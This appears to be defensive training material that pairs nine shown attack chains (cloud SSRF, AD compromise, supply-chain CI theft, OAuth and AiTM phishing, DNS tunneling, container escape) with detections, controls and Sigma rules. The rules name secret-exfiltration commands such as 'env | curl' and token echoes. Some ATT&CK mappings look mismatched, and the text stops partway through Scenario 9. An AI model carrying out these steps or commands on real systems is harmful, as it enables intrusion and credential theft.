<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# Attack Chain Synthesis — Principal Security Engineer Training

> 15 end-to-end attack chains with corresponding detection and defense playbooks.
> Each scenario maps offense to defense at every step.

---

## Scenario 1: External Pentest — Web App RCE — Cloud Metadata SSRF — AWS Account Takeover

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Reconnaissance — enumerate subdomains, tech stack, exposed endpoints | Amass, httpx, nuclei, wappalyzer | T1595.002 (Active Scanning: Vulnerability Scanning) |
| 2 | Identify SSRF vulnerability in image processing endpoint (e.g., `?url=`) | Burp Suite, custom fuzzer | T1190 (Exploit Public-Facing Application) |
| 3 | SSRF to IMDSv1 — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | curl via SSRF, SSRFmap | T1552.005 (Cloud Instance Metadata API) |
| 4 | Retrieve temporary IAM credentials (AccessKeyId, SecretAccessKey, Token) | SSRF response parsing | T1528 (Steal Application Access Token) |
| 5 | Enumerate IAM permissions with stolen creds | enumerate-iam, Pacu | T1087.004 (Account Discovery: Cloud Account) |
| 6 | Discover overprivileged role — `iam:PassRole` + `lambda:CreateFunction` | Pacu, aws cli | T1078.004 (Valid Accounts: Cloud Accounts) |
| 7 | Privilege escalation via Lambda — create function with admin role, invoke it | aws cli, custom payload | T1548 (Abuse Elevation Control Mechanism) |
| 8 | Create backdoor IAM user with programmatic access | aws cli | T1136.003 (Create Account: Cloud Account) |
| 9 | Exfiltrate S3 data, pivot to other services | aws cli, s3cmd | T1530 (Data from Cloud Storage) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | High-volume scanning from single IP against web assets | WAF logs, CloudFront access logs |
| 2 | Outbound requests from app server to internal/metadata IPs | VPC Flow Logs, application logs |
| 3 | IMDSv1 access from application process (not instance boot) | CloudTrail (IMDSv2 enforcement logging), host-based agent |
| 4 | IAM temporary credentials used from IP outside expected CIDR | CloudTrail `sourceIPAddress` anomaly |
| 5 | Rapid `iam:List*`, `iam:Get*` API calls — enumeration fingerprint | CloudTrail, GuardDuty |
| 6 | `iam:PassRole` + `lambda:CreateFunction` in sequence from temp creds | CloudTrail correlation |
| 7 | Lambda function created and invoked within minutes by temp creds | CloudTrail `CreateFunction` + `Invoke` |
| 8 | New IAM user created with `CreateAccessKey` | CloudTrail, GuardDuty `UnauthorizedAccess:IAMUser` |
| 9 | Bulk S3 `GetObject` calls from unfamiliar principal | CloudTrail data events, S3 server access logs |

### Defensive Controls

- **Enforce IMDSv2** (`HttpTokens: required`) on all EC2 instances — eliminates step 3 entirely
- **WAF with SSRF rule set** — block requests containing `169.254.169.254`, `metadata.google.internal`, etc.
- **Least-privilege IAM** — no `iam:PassRole` on application roles; use permission boundaries
- **SCPs** — deny `iam:CreateUser` from non-admin roles at the organization level
- **GuardDuty** enabled with S3 protection and IAM anomaly detection
- **VPC endpoint policies** — restrict which S3 buckets the VPC can reach

### Critical Step Sigma Rule — SSRF to Cloud Metadata

```yaml
title: SSRF Attempt to Cloud Metadata Service Detected in Web Application Logs
id: 7a3c9f12-4e8b-4d2a-b1c6-8f9e0d3a5b7c
status: experimental
description: Detects HTTP requests containing cloud metadata service URLs in web application request parameters, indicating SSRF exploitation.
logsource:
  category: webserver
  product: aws
detection:
  selection_url:
    cs-uri-query|contains:
      - '169.254.169.254'
      - 'metadata.google.internal'
      - '169.254.169.253'
      - '100.100.100.200'
  selection_path:
    cs-uri-query|contains:
      - '/latest/meta-data'
      - '/computeMetadata/v1'
      - '/metadata/instance'
  condition: selection_url or selection_path
falsepositives:
  - Health check systems that legitimately query metadata (should not appear in user-facing request params)
level: critical
tags:
  - attack.t1190
  - attack.t1552.005
  - attack.initial_access
  - attack.credential_access
```

---

## Scenario 2: Phishing — Macro Execution — C2 Beacon — AD Recon — Domain Admin

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Craft phishing email with lure document (invoice, HR document) | GoPhish, custom template | T1566.001 (Phishing: Spearphishing Attachment) |
| 2 | Victim opens Office doc, enables macros | Malicious .docm / .xlsm | T1204.002 (User Execution: Malicious File) |
| 3 | Macro executes PowerShell cradle — downloads staged payload | VBA macro, PowerShell | T1059.001 (Command and Scripting Interpreter: PowerShell) |
| 4 | C2 beacon established over HTTPS (port 443, malleable profile) | Cobalt Strike, Sliver, Mythic | T1071.001 (Application Layer Protocol: Web Protocols) |
| 5 | Local enumeration — whoami, net group, ipconfig, arp -a | Built-in Windows commands | T1033 (System Owner/User Discovery), T1016 (System Network Configuration Discovery) |
| 6 | Credential harvesting — dump LSASS | Mimikatz (in-memory), nanodump, PPLdump | T1003.001 (OS Credential Dumping: LSASS Memory) |
| 7 | AD enumeration — find domain admins, SPNs, ACL misconfigs | BloodHound, SharpHound, ADModule | T1087.002 (Account Discovery: Domain Account) |
| 8 | Kerberoasting — request TGS for service accounts, crack offline | Rubeus, hashcat | T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting) |
| 9 | Lateral movement to DA-accessible system using cracked SPN password | PsExec, WMI, WinRM | T1021.002 (Remote Services: SMB/Windows Admin Shares) |
| 10 | DCSync — replicate all domain password hashes | Mimikatz (lsadump::dcsync) | T1003.006 (OS Credential Dumping: DCSync) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | Email with macro-enabled attachment from external sender | Mail gateway, DMARC/DKIM failures |
| 2 | Office process spawning cmd.exe/powershell.exe | EDR process telemetry, Sysmon Event 1 |
| 3 | PowerShell with encoded command, download cradle patterns | Script Block Logging (Event 4104), AMSI |
| 4 | Beaconing pattern — regular interval HTTPS to uncommon domain | Network metadata (Zeek), JA3/JA3S fingerprinting |
| 5 | Burst of reconnaissance commands from single workstation | EDR command-line logging, Sysmon |
| 6 | LSASS access from non-system process | Sysmon Event 10 (ProcessAccess on lsass.exe), Credential Guard alerts |
| 7 | High-volume LDAP queries (BloodHound collection) | DC LDAP logging, honeypot accounts queried |
| 8 | Spike in TGS requests (RC4 encryption) for service accounts | Windows Event 4769 with encryption type 0x17 |
| 9 | Lateral movement — new service installation, remote process creation | Event 7045, Sysmon Event 1 with parent PsExec |
| 10 | DCSync — replication request from non-DC IP | Event 4662 with `DS-Replication-Get-Changes-All` from workstation |

### Defensive Controls

- **Email filtering** — strip macro-enabled attachments, detonate in sandbox
- **ASR rules** — block Office from creating child processes, block Win32 API calls from macros
- **Credential Guard** — protects LSASS from memory dumping
- **Tiered admin model** — DA accounts never log into workstations
- **gMSA for service accounts** — eliminates Kerberoasting (auto-rotating 120-char passwords)
- **Honeypot accounts** in AD with alerting on any authentication attempt
- **Network segmentation** — workstations cannot reach DCs on replication ports

### Critical Step Sigma Rule — LSASS Access

```yaml
title: Suspicious LSASS Memory Access by Non-System Process
id: 2d8c4e1f-9a7b-4c3d-8e5f-1b2a0c6d9e8f
status: experimental
description: Detects processes accessing LSASS memory with read permissions, indicating credential dumping. Excludes known legitimate security products.
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x1438'
      - '0x143a'
      - '0x1fffff'
  filter_system:
    SourceImage|startswith:
      - 'C:\Windows\system32\'
      - 'C:\Program Files\Windows Defender\'
      - 'C:\ProgramData\Microsoft\Windows Defender\'
  condition: selection and not filter_system
falsepositives:
  - AV/EDR products not in the filter list — add to allowlist after validation
  - Password management software that hooks LSASS
level: critical
tags:
  - attack.t1003.001
  - attack.credential_access
```

---

## Scenario 3: Supply Chain Compromise — Malicious Dependency — CI/CD Pipeline — Production

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Identify target org's dependencies via public repos, lock files | GitHub search, deps.dev | T1591.002 (Gather Victim Org Information: Business Relationships) |
| 2 | Typosquat or take over abandoned package (namespace hijack) | npm/PyPI account, package registries | T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain) |
| 3 | Inject malicious code in install hook / post-install script | Custom payload in setup.py or postinstall.js | T1059 (Command and Scripting Interpreter) |
| 4 | Developer installs or CI pipeline pulls malicious version | Dependency resolution, Dependabot auto-merge | T1195.002 |
| 5 | Payload executes in CI runner — exfiltrate secrets/env vars | Shell script, curl to attacker server | T1552.001 (Unsecured Credentials: Credentials In Files) |
| 6 | Use stolen CI secrets (cloud creds, deploy keys) to access prod | Stolen tokens, SSH keys | T1078.004 (Valid Accounts: Cloud Accounts) |
| 7 | Deploy backdoored artifact to production | CI/CD pipeline manipulation | T1609 (Container Administration Command) |
| 8 | Establish persistence in production — web shell, cron job, modified container image | Custom backdoor | T1505.003 (Server Software Component: Web Shell) |
| 9 | Data exfiltration from production databases | pg_dump, mysqldump over encrypted channel | T1048.001 (Exfiltration Over Alternative Protocol: Encrypted) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | Public repo exposure of internal dependency information | GitHub secret scanning, external attack surface monitoring |
| 2 | New/changed package matching internal dependency names | Package registry monitoring, Socket.dev, Snyk |
| 3 | Package install scripts executing shell commands, network calls | Sandbox analysis of dependencies, lockfile integrity checking |
| 4 | Dependency version change without corresponding developer PR | Git diff on lock files, review automation |
| 5 | CI runner making outbound connections to unknown IPs | CI runner network monitoring, egress firewall logs |
| 6 | Cloud API calls from CI runner IP to resources outside normal scope | CloudTrail, OIDC token audience validation |
| 7 | Artifact hash mismatch between build and deploy | SLSA provenance verification, Sigstore/cosign |
| 8 | New web shell file, unexpected cron entry in container | FIM (file integrity monitoring), container drift detection |
| 9 | Unusual database query volume or export commands in production | Database audit logs, DLP |

### Defensive Controls

- **Lock file pinning with hash verification** — `pip install --require-hashes`, `npm ci` with integrity
- **Private registry mirror** — only pre-approved packages allowed; no direct pulls from public registries
- **CI secret scoping** — secrets only available to specific branches/jobs, not all pipelines
- **OIDC federation** for CI/CD — no long-lived credentials; use short-lived tokens with audience restriction
- **SLSA Level 3** — hermetic builds, provenance attestation, reproducible artifacts
- **Container image signing** (cosign/Notation) — reject unsigned images in admission controller
- **Network policy in CI** — restrict outbound from build runners to known registries only
- **Dependabot/Renovate** with mandatory human review — no auto-merge

### Critical Step Sigma Rule — CI Secret Exfiltration

```yaml
title: CI/CD Runner Exfiltrating Environment Variables to External Host
id: 3f5a8b2c-7d1e-4f6a-9c3b-5e8d0a2f1b4c
status: experimental
description: Detects CI runner processes accessing environment variables and making outbound HTTP requests to non-allowlisted destinations, indicating secret exfiltration from a compromised dependency.
logsource:
  category: process_creation
  product: linux
detection:
  selection_env:
    CommandLine|contains:
      - 'printenv'
      - '/proc/self/environ'
      - 'env | curl'
      - 'echo $AWS_'
      - 'echo $GITHUB_TOKEN'
  selection_exfil:
    CommandLine|contains:
      - 'curl'
      - 'wget'
      - 'nc '
    CommandLine|re: 'https?://(?!registry\.(npmjs\.org|pypi\.org|docker\.io))'
  condition: selection_env or selection_exfil
falsepositives:
  - Legitimate CI steps that upload artifacts to external storage — validate against known endpoints
level: high
tags:
  - attack.t1552.001
  - attack.t1048
  - attack.credential_access
  - attack.exfiltration
```

---

## Scenario 4: Password Spray — O365 Access — OAuth Consent Phishing — Data Exfiltration

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Harvest email addresses from LinkedIn, Hunter.io, SEC filings | theHarvester, LinkedIn scraping | T1589.002 (Gather Victim Identity Information: Email Addresses) |
| 2 | Password spray against O365/Entra ID — common passwords, seasonal patterns | MSOLSpray, Spray, o365spray | T1110.003 (Brute Force: Password Spraying) |
| 3 | Successfully authenticate to one or more accounts (no MFA or SMS MFA bypassed) | Valid credentials | T1078.004 (Valid Accounts: Cloud Accounts) |
| 4 | Register malicious Azure AD application with broad permissions | Azure portal, az cli | T1098.003 (Account Manipulation: Additional Cloud Roles) |
| 5 | Send OAuth consent phishing link from compromised mailbox to internal users | Outlook, custom OAuth app | T1566.002 (Phishing: Spearphishing Link) |
| 6 | Victims consent to malicious app — grants Mail.Read, Files.ReadWrite, etc. | OAuth consent flow | T1550.001 (Use Alternate Authentication Material: Application Access Token) |
| 7 | Use app permissions to read email, OneDrive, SharePoint via Graph API | Microsoft Graph API, GraphRunner | T1114.002 (Email Collection: Remote Email Collection) |
| 8 | Exfiltrate sensitive data — financial records, IP, PII | Graph API bulk download, custom scripts | T1567.002 (Exfiltration Over Web Service: Exfiltration to Cloud Storage) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | N/A — passive collection from public sources | External threat intelligence |
| 2 | Multiple failed auth attempts across many accounts from same IP/ASN | Azure AD Sign-in logs, Identity Protection |
| 3 | Successful login after spray pattern, from anomalous location/device | Azure AD risky sign-ins, impossible travel |
| 4 | New app registration with high-privilege API permissions | Azure AD audit logs, `Add application` events |
| 5 | Internal user sending emails with OAuth authorization URLs | Mail flow rules, DLP policies |
| 6 | User consenting to application with sensitive scopes | Azure AD audit log `Consent to application`, consent type = `AllPrincipals` |
| 7 | Graph API calls with unusual volume from newly registered app | Azure AD app activity, Graph API audit |
| 8 | Bulk file download or email access via Graph API exceeding baseline | Microsoft Defender for Cloud Apps, CASB |

### Defensive Controls

- **Conditional Access** — require phishing-resistant MFA (FIDO2/Windows Hello), block legacy auth protocols
- **Smart lockout + IP lockout** — detect and throttle spray attempts
- **Admin consent workflow** — users cannot consent to apps; admin approval required for all OAuth grants
- **Restrict app registration** — only admins can register applications in Entra ID
- **App governance (Defender for Cloud Apps)** — monitor and auto-revoke overprivileged apps
- **Block consent to unverified publishers** — tenant-level setting in Entra ID
- **DLP policies** — detect and block bulk data download from SharePoint/OneDrive

### Critical Step Sigma Rule — Illicit OAuth Consent Grant

```yaml
title: User Consented to OAuth Application with Sensitive Permissions
id: 4c7d9e3a-8b2f-4a1c-b5d6-0e9f3c8a7d2b
status: experimental
description: Detects when a user grants consent to an OAuth application requesting high-privilege Graph API permissions (Mail.Read, Files.ReadWrite.All, etc.), a key indicator of OAuth consent phishing.
logsource:
  product: azure
  service: auditlogs
detection:
  selection:
    operationName: 'Consent to application'
  filter_permissions:
    targetResources.modifiedProperties.newValue|contains:
      - 'Mail.Read'
      - 'Mail.ReadWrite'
      - 'Files.ReadWrite.All'
      - 'Sites.ReadWrite.All'
      - 'User.ReadWrite.All'
      - 'Directory.ReadWrite.All'
  condition: selection and filter_permissions
falsepositives:
  - Legitimate third-party SaaS apps requiring mail/file permissions — maintain an allowlist of approved app IDs
level: high
tags:
  - attack.t1550.001
  - attack.t1098.003
  - attack.credential_access
  - attack.persistence
```

---

## Scenario 5: OSINT — Targeted Phishing — Evilginx MFA Bypass — Azure AD Compromise

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | OSINT on target executives — social media, conference talks, press releases | Maltego, SpiderFoot, manual research | T1593 (Search Open Websites/Domains) |
| 2 | Identify target's SSO portal (e.g., `login.company.com` → Azure AD) | DNS recon, subfinder, WHOIS | T1589.001 (Gather Victim Identity Information: Credentials) |
| 3 | Set up Evilginx2 phishlet for target's IdP — real-time proxy | Evilginx2 with Azure AD phishlet | T1557 (Adversary-in-the-Middle) |
| 4 | Register convincing domain, obtain TLS cert (Let's Encrypt) | Namecheap, certbot | T1583.001 (Acquire Infrastructure: Domains) |
| 5 | Send targeted phishing email with Evilginx URL to executive | Custom email from spoofed/similar domain | T1566.002 (Phishing: Spearphishing Link) |
| 6 | Victim authenticates through proxy — attacker captures session token AND MFA token | Evilginx2 session capture | T1539 (Steal Web Session Cookie), T1111 (Multi-Factor Authentication Interception) |
| 7 | Import stolen session cookie into browser — access Azure portal/O365 as victim | Browser cookie editor, Azure portal | T1550.004 (Use Alternate Authentication Material: Web Session Cookie) |
| 8 | Escalate — add attacker device as trusted, register new MFA method | Azure AD portal | T1098.005 (Account Manipulation: Device Registration) |
| 9 | Access sensitive resources — SharePoint, Teams, Azure subscriptions | O365 apps, Azure portal | T1213.002 (Data from Information Repositories: SharePoint) |
| 10 | Establish persistence — federate external IdP or add service principal creds | AADInternals, az cli | T1484.002 (Domain Policy Modification: Domain Trust Modification) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 3 | Newly registered domain mimicking corporate SSO, with recent TLS cert | Certificate Transparency monitoring (certstream), domain monitoring |
| 5 | Email from lookalike domain with link to non-corporate login page | Email gateway, URL detonation sandbox |
| 6 | Authentication from proxy IP, different ASN than user's normal location | Azure AD sign-in logs, impossible travel detection |
| 7 | Session cookie used from new IP/device without fresh authentication | Continuous access evaluation (CAE), token binding |
| 8 | New MFA method registered or device added immediately after anomalous sign-in | Azure AD audit logs, Identity Protection |
| 10 | Domain federation change or new service principal credentials added | Azure AD audit logs — `Set domain authentication`, `Add service principal credentials` |

### Defensive Controls

- **FIDO2/Passkeys** — cryptographically bound to origin; Evilginx proxy domain fails origin check, MFA cannot be intercepted
- **Conditional Access** — require compliant/managed device, restrict by named location
- **Continuous Access Evaluation (CAE)** — revoke tokens in near-real-time on sign-in risk change
- **Token binding** — bind session tokens to device certificate (preview in Entra ID)
- **Certificate Transparency monitoring** — alert on certs issued for lookalike domains
- **Number matching + additional context in MFA push** — reduces MFA fatigue (though Evilginx proxies the real prompt)
- **Break-glass alerting** — immediate alert on any domain federation change or new IdP trust

### Critical Step Sigma Rule — Session Token Theft via AiTM Proxy

```yaml
title: Azure AD Authentication from Known AiTM Proxy Infrastructure
id: 5e8f1a4b-9c3d-4b2e-a7f8-2d6c0e1b3a5f
status: experimental
description: Detects Azure AD sign-ins where the session shows characteristics of adversary-in-the-middle token theft — authentication from a different IP than MFA challenge, or known Evilginx infrastructure indicators.
logsource:
  product: azure
  service: signinlogs
detection:
  selection_anomaly:
    riskState: 'atRisk'
    riskDetail|contains: 'anomalousToken'
  selection_ip_mismatch:
    authenticationRequirement: 'multiFactorAuthentication'
    status.errorCode: 0
  filter_managed:
    deviceDetail.isCompliant: true
  condition: (selection_anomaly or selection_ip_mismatch) and not filter_managed
falsepositives:
  - Users authenticating through corporate VPN that splits auth traffic — correlate with VPN gateway IPs
level: critical
tags:
  - attack.t1539
  - attack.t1111
  - attack.credential_access
```

---

## Scenario 6: Exposed S3 Bucket — Credential Discovery — IAM Privilege Escalation — Crypto Mining

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Scan for open S3 buckets via keyword permutations of target name | GrayhatWarfare, bucket finder, S3Scanner | T1530 (Data from Cloud Storage) |
| 2 | Enumerate and download bucket contents — find `.env`, config files, backups | aws cli (`--no-sign-request`), s3cmd | T1530 |
| 3 | Extract AWS credentials from discovered files | Manual review, trufflehog | T1552.001 (Unsecured Credentials: Credentials In Files) |
| 4 | Validate credentials and enumerate permissions | aws sts get-caller-identity, enumerate-iam | T1078.004 (Valid Accounts: Cloud Accounts) |
| 5 | Discover IAM misconfig — user can attach policies to self | Pacu (`iam__privesc_scan`) | T1087.004 (Account Discovery: Cloud Account) |
| 6 | Attach AdministratorAccess policy to compromised user | aws iam attach-user-policy | T1098.001 (Account Manipulation: Additional Cloud Credentials) |
| 7 | Launch EC2 instances (GPU) across multiple regions for crypto mining | aws ec2 run-instances (p3/g4 instances) | T1496 (Resource Hijacking) |
| 8 | Deploy mining software (XMRig) via user data script | EC2 user data, cloud-init | T1059.004 (Command and Scripting Interpreter: Unix Shell) |
| 9 | Maintain access — create additional IAM keys, disable CloudTrail | aws cli | T1562.008 (Impair Defenses: Disable or Modify Cloud Logs) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1-2 | Public access to S3 bucket from non-corporate IPs | S3 server access logs, AWS Access Analyzer |
| 3 | Credentials committed to files (preventable at source) | Pre-commit hooks (trufflehog, gitleaks), S3 object scanning |
| 4 | API calls from unusual IP for existing IAM user | CloudTrail, GuardDuty `UnauthorizedAccess` |
| 5-6 | `AttachUserPolicy` with `AdministratorAccess` — privilege escalation | CloudTrail, custom Lambda alert |
| 7 | EC2 instances launched in unusual regions, GPU instance type | CloudTrail `RunInstances`, AWS Budgets alert, Service Quotas |
| 8 | High CPU/GPU utilization, connections to mining pools | VPC Flow Logs, GuardDuty `CryptoCurrency` finding |
| 9 | `DeleteTrail`, `StopLogging`, or `CreateAccessKey` events | CloudTrail (if org-level trail exists), GuardDuty |

### Defensive Controls

- **S3 Block Public Access** — account-level and bucket-level, enforced via SCP
- **AWS Access Analyzer** — continuous scanning for publicly accessible resources
- **Secret scanning** — automated scanning of all repositories and S3 objects for credentials
- **IAM permission boundaries** — prevent self-escalation; no user can modify their own policies
- **SCPs** — deny `ec2:RunInstances` for GPU instance families unless explicitly allowed, deny `cloudtrail:StopLogging`
- **AWS Budgets** — alert on unexpected spend increase (crypto mining causes immediate cost spike)
- **Service Quotas** — restrict GPU instance limits to zero in unused regions
- **Organization-level CloudTrail** — cannot be disabled by member accounts

### Critical Step Sigma Rule — IAM Self-Escalation

```yaml
title: IAM User Attached High-Privilege Policy to Self
id: 6a9b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: Detects an IAM user attaching AdministratorAccess or other high-privilege managed policies to their own user, indicating privilege escalation via IAM misconfiguration.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: 'AttachUserPolicy'
  filter_selfescalation:
    requestParameters.userName: '%userIdentity.userName%'
    requestParameters.policyArn|contains:
      - 'AdministratorAccess'
      - 'PowerUserAccess'
      - 'IAMFullAccess'
  condition: selection and filter_selfescalation
falsepositives:
  - Automated provisioning systems where the creating identity matches the target — rare and should be investigated
level: critical
tags:
  - attack.t1098.001
  - attack.privilege_escalation
  - attack.persistence
```

---

## Scenario 7: VPN Vulnerability — LLMNR Poisoning — NTLM Relay — ADCS — Domain Admin

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Exploit VPN appliance vulnerability (e.g., CVE-2023-46805/CVE-2024-21887 Ivanti, CVE-2023-27997 FortiGate) | Public exploit, custom payload | T1190 (Exploit Public-Facing Application) |
| 2 | Gain shell on VPN appliance — internal network access without VPN client | Reverse shell, web shell | T1059.004 (Unix Shell) |
| 3 | Pivot to internal VLAN — deploy tooling to compromised host or pivot through appliance | Chisel, ligolo-ng, SSH tunneling | T1090.001 (Proxy: Internal Proxy) |
| 4 | LLMNR/NBT-NS/mDNS poisoning on internal network — capture NTLMv2 hashes | Responder | T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay) |
| 5 | Instead of cracking, relay captured NTLM authentication to vulnerable target | ntlmrelayx | T1557.001 |
| 6 | Relay to AD CS web enrollment (HTTP endpoint — no signing required) | ntlmrelayx with `--adcs` flag | T1649 (Steal or Forge Authentication Certificates) |
| 7 | Obtain certificate for relayed user (often a machine account with DCSync rights) | ntlmrelayx output | T1649 |
| 8 | Use certificate to request TGT via PKINIT | Rubeus `asktgt /certificate:` | T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting) |
| 9 | If machine account — perform DCSync with obtained TGT | Mimikatz `lsadump::dcsync` | T1003.006 (DCSync) |
| 10 | Golden ticket / pass-the-hash for persistent domain admin access | Mimikatz, Rubeus | T1558.001 (Golden Ticket) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | Exploitation signatures, anomalous process execution on VPN appliance | VPN appliance logs, IDS/IPS, EDR on appliance (if supported) |
| 2 | New process or web shell on VPN appliance, outbound reverse shell | File integrity monitoring on appliance, network metadata |
| 3 | Unexpected tunneling traffic patterns (SOCKS, Chisel signatures) | Network IDS, deep packet inspection |
| 4 | LLMNR/NBT-NS responses from non-DNS server IP | Network monitoring, honeypot LLMNR names |
| 5-6 | NTLM authentication to ADCS web enrollment from unexpected source | ADCS audit logs, Windows Event 4768/4769, IIS logs on CA |
| 7 | Certificate issued for machine account via web enrollment | ADCS Event 4887 (Certificate request), CA audit logs |
| 8 | PKINIT authentication with certificate for account that normally uses password | Event 4768 with certificate-based pre-auth from workstation |
| 9 | DCSync — replication from non-DC | Event 4662 `DS-Replication-Get-Changes-All` from non-DC source |

### Defensive Controls

- **Patch VPN appliances** within 24-48 hours for critical CVEs; consider ZTNA alternatives to traditional VPN
- **Disable LLMNR, NBT-NS, mDNS** via GPO across all systems — no legitimate need in managed environments
- **Require SMB signing and LDAP signing** — prevents NTLM relay
- **ADCS hardening** — require EPA (Extended Protection for Authentication) on web enrollment, enforce certificate manager approval, disable HTTP enrollment
- **Remove ESC1-ESC8 vulnerabilities** — audit with Certify/Certipy, remediate template misconfigurations
- **Network segmentation** — VPN concentrators in isolated DMZ, cannot directly reach internal AD infrastructure
- **Privileged Access Workstations (PAWs)** — domain admin activities only from hardened, isolated systems

### Critical Step Sigma Rule — NTLM Relay to ADCS

```yaml
title: NTLM Authentication to ADCS Web Enrollment from Non-Standard Source
id: 7b0c3d4e-5f6a-7b8c-9d0e-1f2a3b4c5d6e
status: experimental
description: Detects NTLM authentication to the Active Directory Certificate Services web enrollment endpoint from a source that is not the account's registered workstation, indicating NTLM relay to ADCS (ESC8).
logsource:
  product: windows
  service: security
  category: authentication
detection:
  selection:
    EventID: 4768
    CertificateInformation.CertificateIssuerName|contains: '-CA'
    TicketEncryptionType: '0x17'
  selection_iis:
    cs-uri-stem|contains: '/certsrv/'
    cs-method: 'POST'
    cs-username|endswith: '$'
  condition: selection or selection_iis
falsepositives:
  - Legitimate automated certificate enrollment from management servers — baseline expected sources
level: critical
tags:
  - attack.t1557.001
  - attack.t1649
  - attack.credential_access
  - attack.lateral_movement
```

---

## Scenario 8: Insider Threat — Data Staging — DNS Tunneling Exfiltration

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Insider with legitimate access identifies high-value data (source code, customer DB, trade secrets) | Internal systems, file shares | T1083 (File and Directory Discovery) |
| 2 | Stage data to local workstation — copy from network shares, databases | Robocopy, scp, database export tools | T1074.001 (Data Staged: Local Data Staging) |
| 3 | Compress and encrypt staged data | 7zip with AES-256, VeraCrypt container | T1560.001 (Archive Collected Data: Archive via Utility) |
| 4 | Split archive into small chunks suitable for DNS exfil | split, custom script | T1030 (Data Transfer Size Limits) |
| 5 | Register domain for DNS tunneling, set up DNS server | Namecheap, iodine server, dnscat2 server | T1583.001 (Acquire Infrastructure: Domains) |
| 6 | Exfiltrate data via DNS queries — encode chunks as subdomain labels | iodine, dnscat2, custom DNS exfil tool | T1048.003 (Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol) |
| 7 | Reassemble and decrypt data on attacker-controlled server | Custom script, 7zip | N/A (post-exfil) |
| 8 | Cover tracks — delete staged files, clear logs, modify timestamps | shred, wevtutil, timestomp | T1070 (Indicator Removal) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1-2 | Bulk file access or database export exceeding user baseline | DLP, file access auditing, database audit logs |
| 3 | Encryption tool execution (7zip, VeraCrypt) with large input | EDR process monitoring, Sysmon |
| 4 | File splitting utility execution on workstation | EDR, unusual process execution |
| 5 | DNS queries to newly registered domain (NRD) | DNS logs, threat intel feeds for NRDs |
| 6 | **DNS tunneling indicators**: high query volume, long subdomain labels (>50 chars), high entropy in query names, TXT/NULL record requests | DNS logs (passive DNS), Zeek dns.log, DNS firewall |
| 7 | N/A — external to network | |
| 8 | Log deletion events, timestamp manipulation | Event 1102 (audit log cleared), Sysmon Event 2 (file time change) |

### Defensive Controls

- **DLP** — monitor and block bulk file operations, USB usage, cloud upload
- **DNS inspection** — deploy DNS firewall/proxy that analyzes query entropy, label length, volume per domain
- **UEBA** — baseline per-user data access patterns; alert on deviations (more files, unusual hours, new data sources)
- **Database Activity Monitoring (DAM)** — alert on bulk exports, `SELECT *` on sensitive tables
- **USB/removable media** policies — disable or audit all removable storage via GPO
- **Egress DNS** — force all DNS through internal resolvers; block direct DNS (53/UDP/TCP) at firewall
- **Network DLP** — inspect DNS payload entropy, block queries with Base64/hex-encoded subdomains
- **Insider threat program** — combine HR signals (resignation, PIP) with technical indicators

### Critical Step Sigma Rule — DNS Tunneling

```yaml
title: DNS Tunneling Detected via High-Entropy Subdomain Queries
id: 8c1d4e5f-6a7b-8c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: Detects DNS queries with abnormally long subdomain labels and high query frequency to a single domain, consistent with DNS tunneling exfiltration tools like iodine or dnscat2.
logsource:
  category: dns_query
  product: windows
detection:
  selection_long_query:
    query|re: '^[a-z0-9]{30,}\.'
  selection_txt:
    record_type:
      - 'TXT'
      - 'NULL'
      - 'CNAME'
    query|re: '^[a-z0-9]{20,}\.[a-z0-9]{20,}\.'
  timeframe: 5m
  condition: selection_long_query | count(query) by query_domain > 100 | 5m or selection_txt | count(query) by query_domain > 50 | 5m
falsepositives:
  - DKIM validation queries (long but predictable format)
  - Antivirus/security product cloud lookups with encoded hashes
level: high
tags:
  - attack.t1048.003
  - attack.exfiltration
```

---

## Scenario 9: Container Escape — Node Compromise — Kubernetes Cluster Takeover

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Gain code execution in container (via web app vuln, compromised image) | Exploit, RCE in application | T1190 (Exploit Public-Facing Application) |
| 2 | Enumerate container environment — check for privileged mode, mounted sockets, capabilities | amicontained, LinPEAS, manual checks | T1082 (System Information Discovery) |
| 3 | Container escape via one of: mounted Docker socket, privileged container + cgroup escape, kernel exploit, or mounted host filesystem | CDK, custom exploit, nsenter | T1611 (Escape to Host) |
| 4 | On node — access kubelet credentials at `/var/lib/kubelet/` | File system access | T1552.001 (Unsecured Credentials: Credentials In Files) |
